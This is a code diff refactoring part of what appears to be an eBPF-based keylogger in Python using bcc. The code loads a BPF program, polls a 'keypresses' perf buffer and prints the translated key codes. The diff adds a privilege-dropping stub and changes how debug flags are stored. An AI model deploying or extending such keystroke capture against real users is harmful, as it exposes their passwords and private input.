@@ -23,12 +23,17 @@ from bcc import BPF
 
 from defs import project_path, ticksleep
 from keys import translate_keycode
+from utils import drop_privileges
 
 class BPFProgram():
     def __init__(self, args):
         self.bpf = None
 
-        self.debug = args.debug
+        self.args = args
+
+    @drop_privileges
+    def open_file(self):
+        pass
 
     def register_exit_hooks(self):
         # Catch signals so we still invoke atexit
@@ -46,16 +51,17 @@ class BPFProgram():
     def register_perf_buffers(self):
         def keypress(cpu, data, size):
             event = self.bpf["keypresses"].event(data)
-            print(translate_keycode(event.code))
+            key = translate_keycode(event.code)
+            if key:
+                print(key)
         self.bpf["keypresses"].open_perf_buffer(keypress)
-
 
     def load_bpf(self):
         assert self.bpf == None
 
         # Set flags
         flags = []
-        if self.debug:
+        if self.args.debug:
             flags.append(f'-DBKL_DEBUG')
 
         with open(os.path.join(project_path, "src/bpf/bpf_program.c"), "r") as f:
@@ -71,6 +77,6 @@ class BPFProgram():
 
         while True:
             time.sleep(ticksleep)
-            if self.debug:
+            if self.args.debug:
                 self.bpf.trace_print()
             self.bpf.perf_buffer_poll()
